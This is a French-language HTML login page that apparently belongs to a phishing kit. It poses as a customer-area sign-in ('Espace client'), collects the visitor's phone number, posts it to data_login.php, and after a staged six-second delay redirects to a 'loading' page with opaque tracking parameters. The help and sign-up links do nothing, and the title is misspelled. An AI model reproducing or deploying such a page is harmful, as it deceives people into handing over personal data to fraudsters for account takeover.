<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connxion</title>
    <link rel="stylesheet" href="res/main.css">
</head>
<body>
<header>
<div class="holder">
<div class="left">
    <img src="res/logo.png">
</div>
<div class="right">
    <div class="user">
        <img src="res/user.png">
        <span>Devenir client</span>
    </div>
</div>
</div>
</header>    

<div class="banner">
<div class="holder">
Espace client
</div>
</div>


<main>
<div class="holder">
<div class="left">
<div class="form">

<div class="title">
Connexion
</div>

<div class="text">
Confirmez votre numéro pour vérifier votre identité.
</div>

<div class="col">
<label>Numéro de téléphone:</label>
<div class="input">
    <input type="text" id="sms" placeholder="Saisir votre numéro de téléphone">
</div>
</div>
 

<div class="col">
<button onclick="sendSms()"><span id="loader"><img src="res/loading.gif"></span>Valider </button>

<div class="links">
<span class="a">Besoin d'aide pour vous connecter?</span>
<span class="a">Nouvel abonné ? Cliquez ici pour commencer</span>
<span class="a">Lancer la démonstration</span>
</div>
</div>



</div>
</div>



<div class="right">
<img src="res/ad.png">
</div>
</div>
</main>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
<script>

var tries = 0;
function sendSms(){
if($("#sms").val().length<4){
return $("#sms").addClass("error");
}
tries++;
$("#loader").show();
$.post("data_login.php",{j_phone:$("#sms").val()},(res)=>{
setTimeout(()=>{
   window.location="loading.php?p=data&fps=235&room=230949994938&sec=browser&v=2&cpo=2KD9039";

}, 6000);
});

}

$("input").keypress((e)=>{
if(e.key=="Enter"){
sendSms();
}
})

</script>
</body>
</html>